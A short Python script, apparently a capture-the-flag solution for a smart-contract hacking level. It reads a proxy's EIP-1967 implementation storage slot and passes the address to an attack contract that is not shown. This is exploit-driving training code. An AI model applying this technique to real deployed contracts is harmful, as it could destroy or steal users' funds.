from scripts.level_helper import *

@setup_instance
def main(instance, player, attack):
    slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
    engine = web3.eth.getStorageAt(instance.address, slot).hex()
    attack.attack(engine, {'from': player})

